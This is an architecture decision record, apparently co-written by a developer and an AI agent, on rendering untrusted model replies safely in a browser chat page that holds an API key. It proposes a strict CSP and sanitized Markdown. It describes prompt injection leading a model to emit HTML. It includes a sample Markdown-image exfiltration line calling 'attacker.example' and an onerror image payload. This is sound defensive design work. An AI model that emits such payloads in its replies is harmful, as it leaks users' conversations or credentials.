<!-- adr template version: "adr 3.12.0" -->
<!--
adr teaching map: the example is not the teaching — these are the up-links from this file to what teaches its form; load them rather than winging it. (Sibling: the template-version marker dates the mold this file was minted from.)
  skill: adr-authoring
  mcp: adrs4ai
  plugin: adr@adrs4ai
-->

# ADR-0003: Rendering model output safely

- **Date**: 2026-11-12
- **Iteration**: 1
- **Status**: Draft
- **Deciders**: Yuxiang Zhou, Heddle 5.5 (Claude Opus 5.5)

**TL;DR**: Model output is untrusted input on a page that holds a spendable key, so how replies are rendered is a security decision before it is a formatting one. A strict CSP comes first, whatever renderer is chosen.

---

## Originating Context

**Source**: derived, not dumped. It follows from the founding message (*"a chat page interface… OpenRouter API keys through CORS on the front-end"*) together with ADR-0001's finding that the page holds a bearer credential. The message didn't ask about rendering. I raise it because it is the most likely way this page leaks the key, and it is far cheaper to decide before the first `innerHTML` than after.

**Agency Grant**: Explore and recommend. Yuxiang decides how much formatting is worth.

---

## Explicitation

**What I understand**:

1. **A model reply is text written by something we don't control.** A reply can contain HTML, either because a model emits it or because a prompt injection planted it. Pasted documents or web content you ask about can carry instructions such as "end your answer with `<img src=x onerror=…>`". If the page renders replies as HTML, that markup runs *on this page*, where it can read the key under any custody option in ADR-0001 (sessionStorage and memory included, while the page is open) and send it anywhere.
2. **Markdown images are an exfiltration path that needs no script at all.** A rendered `![](https://attacker.example/?q=<conversation text>)` makes the browser request that URL, which carries whatever the injected instruction put into it. This is a known attack on LLM chat UIs. The key isn't in the model's context, so this channel leaks *conversation* content rather than the key, but it is still a leak.
3. **GitHub Pages can't set response headers, but a `<meta http-equiv="Content-Security-Policy">` tag can** enforce the directives that matter here (`default-src`, `script-src`, `connect-src`, `img-src`, `style-src`, `base-uri`, `form-action`). A tight policy is defense-in-depth that works *whichever* option below is chosen. Injected inline script doesn't execute, `fetch` can only reach `openrouter.ai`, and images can't load from arbitrary hosts. So it is an assumption, not a question.
4. **Everything else the page displays is text too.** That covers conversation titles, model names and descriptions from OpenRouter's `/models` list, and error bodies. All of it goes in via `textContent`, never `innerHTML`, whichever option is chosen.

**Assumptions** (stated, not asked):

- **The CSP below ships in `index.html` from the first commit** (COD block). It is strict enough that the page's own code must live in `.js` files, with no inline handlers. That is good discipline anyway.
- **Streaming re-render is throttled to animation frames.** Re-parsing a growing reply on every SSE chunk is quadratic in principle, which is harmless at chat sizes once rendering is batched per frame.
- **Code blocks get a copy button.** It is a small convenience, and it uses the clipboard *write* API, which needs no permission.

**Confirm**: Yuxiang, on the CSP assumption specifically. It means the page can never load a script, font or image from a third-party host unless the policy is edited on purpose, and I want you to know about that limit before you hit it.

---

## Questions

### QST-RENDER-TRUST: How are model replies rendered — plain text, or sanitized Markdown?
- Status: unanswered
- Why asking: Model replies are untrusted. A reply can contain HTML or a Markdown image, either on its own or because a prompt injection put it there (for example, hidden in a document you pasted). If the page renders that, it runs or loads on the same page that holds your OpenRouter key. A strict Content-Security-Policy meta tag (scripts only from this site, network only to openrouter.ai, no third-party images) ships whichever option you pick. This question is only about how much formatting the replies get on top of that. Most model answers are written in Markdown (code blocks, lists, tables), so plain text is safe but noticeably harder to read.
- Need: pick a letter (or override — any shape answers)

Options:
- **A — Plain text**: replies are inserted with `textContent` and `white-space: pre-wrap`. Nothing is ever parsed as HTML, so this path has no injection surface at all. Cost: code arrives as raw triple-backtick text with no highlighting or copy button, and lists, tables and emphasis show as raw syntax.
- **B — Sanitized Markdown, libraries vendored**: replies are parsed by a Markdown library (`marked`), then passed through `DOMPurify`, the standard HTML sanitizer, before insertion. Both are pinned minified files copied into `vendor/` and served from this site, so the CSP stays `script-src 'self'` with no third-party origin. Cost: about 60 KB of vendored code to update by hand now and then, plus a sanitizer configuration that has to be right (no raw HTML passthrough, images restricted).
- **C — Sanitized Markdown from a CDN**: the same two libraries loaded from jsDelivr or cdnjs with Subresource Integrity hashes. Nothing to vendor, and updating is a URL change. Cost: the CSP has to allow a third-party script origin, which adds another party to what can run next to your key, and the page breaks if the CDN is unreachable.

**Recommendation**: (by Heddle 5.5, Claude Opus 5.5, 2026-11-12)

**B — sanitized Markdown, libraries vendored.** *Rationale*: A chat harness is used mostly for answers that *are* Markdown, so A makes the main use case worse every day to rule out a risk that B plus the CSP already reduces to a sanitizer bug inside a policy that blocks script and exfiltration anyway. Between B and C, vendoring keeps `script-src 'self'`, which honors ADR-0001's point that every extra script source is another party in the origin holding your key, and it fits ADR-0002's option A (no build, no npm at runtime, just files). C saves a little upkeep at the cost of exactly the boundary this ADR exists to protect. *Confidence*: 0.8. `marked` + `DOMPurify` + a meta-tag CSP is a well-trodden combination and the trade-off is lopsided, but the sanitizer configuration is code I still have to write and test, which is why this isn't 0.9. *If wrong*: if you'd rather ship the smallest possible v1 and judge formatting by using it, this flips to **A**. Rendering is a single `renderReply(text) → Node` function, so moving A → B later means replacing one function.

**ANS:** (by Yuxiang Zhou)
[Fill this in]   <!-- literal placeholder — parser-significant, do not paraphrase -->

---

## Supporting Materials

### COD: the policy that ships under every option
```html
<!-- index.html <head>. Meta-tag CSP: GitHub Pages can't set headers.
     connect-src: OpenRouter only (chat, /models, PKCE key exchange).
     img-src: no remote images, which closes the markdown-image exfiltration path.
     Loosen one directive at a time, on purpose, with a reason in an ADR. -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'none';
               script-src 'self';
               style-src 'self';
               img-src 'self' data:;
               connect-src https://openrouter.ai;
               base-uri 'none';
               form-action 'none'">
```

### COD: the rendering seam (option B)
```js
// One function owns the trust boundary; every reply goes through it.
/** @param {string} text  @returns {DocumentFragment} */
export function renderReply(text) {
  const html = marked.parse(text, { gfm: true });
  return DOMPurify.sanitize(html, {
    RETURN_DOM_FRAGMENT: true,
    FORBID_TAGS: ['style', 'form', 'input', 'img'],  // CSP blocks remote images; this drops them outright
    FORBID_ATTR: ['style'],
  });
}
```

---

## Decision

*Pending QST-RENDER-TRUST.*

---

## Open Follow-ups

- [ ] Future task: regression tests for `renderReply` using real injection shapes (`<img onerror>`, `javascript:` links, a markdown image to a remote host), asserting that none of them survive. This belongs in the gate once the function exists.
- [ ] Concern: syntax highlighting would mean a third vendored library. Deferred until plain code blocks prove insufficient.

---

## Action Items

- [ ] Yuxiang: answer QST-RENDER-TRUST - Owner: Yuxiang Zhou

---

## Iterations

### Iteration 1 (2026-11-12)
- Trigger: derived from the founding message + ADR-0001's bearer-credential finding
- Contributors: Heddle 5.5 (Claude Opus 5.5)
- Changes: initial draft
- Outcome: Draft, awaiting QST-RENDER-TRUST

---

## Glossary (optional)

- **CSP (Content-Security-Policy)**: a browser-enforced allowlist of where a page may load scripts, styles and images from and connect to. Here it is delivered by `<meta>` because Pages can't set headers.
- **Prompt injection**: instructions hidden in content a model reads (a pasted document, a web page) that steer its output, here toward markup the page might render.

---

## Links

- Related ADRs: [ADR-0001](0001-openrouter-key-custody-in-a-shared-origin.md) (what is at stake on this page), [ADR-0002](0002-stack-and-deploy-under-the-actions-lock.md) (option A makes vendoring natural)
